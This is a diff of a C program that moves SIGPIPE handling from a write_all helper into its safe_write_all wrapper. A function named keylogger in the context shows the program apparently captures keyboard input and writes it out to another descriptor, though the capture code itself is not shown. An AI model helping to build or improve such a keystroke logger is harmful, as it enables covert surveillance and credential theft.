@@ -96,12 +96,6 @@ void sigint_handler(int sig){
  * \returns 1 if writing completes succesfully, else 0
  */
 int write_all(int file_desc, const char *str){
-    struct sigaction new_actn, old_actn;
-    new_actn.sa_handler = SIG_IGN;
-    sigemptyset (&new_actn.sa_mask);
-    new_actn.sa_flags = 0;
-    sigaction(SIGPIPE, &new_actn, &old_actn);
-
     int bytesWritten = 0;
     int bytesToWrite = strlen(str) + 1;
 
@@ -109,28 +103,36 @@ int write_all(int file_desc, const char *str){
         bytesWritten = write(file_desc, str, bytesToWrite);
 
         if(bytesWritten == -1){
-            sigaction(SIGPIPE, &old_actn, NULL);
             return 0;
         }
         bytesToWrite -= bytesWritten;
         str += bytesWritten;
     } while(bytesToWrite > 0);
 
-    sigaction(SIGPIPE, &old_actn, NULL);
     return 1;
 }
 
 
 /**
- * Wrapper around write_all which exits safely if the write fails
+ * Wrapper around write_all which exits safely if the write fails, without
+ * the SIGPIPE terminating the program abruptly.
  */
 void safe_write_all(int file_desc, const char *str, int keyboard){
+    struct sigaction new_actn, old_actn;
+    new_actn.sa_handler = SIG_IGN;
+    sigemptyset (&new_actn.sa_mask);
+    new_actn.sa_flags = 0;
+
+    sigaction(SIGPIPE, &new_actn, &old_actn);
+
     if(!write_all(file_desc, str)){
         close(file_desc);
         close(keyboard);
         perror("\nwriting");
         exit(1);
     }
+
+    sigaction(SIGPIPE, &old_actn, NULL);
 }
 
 void keylogger(int keyboard, int writeout){
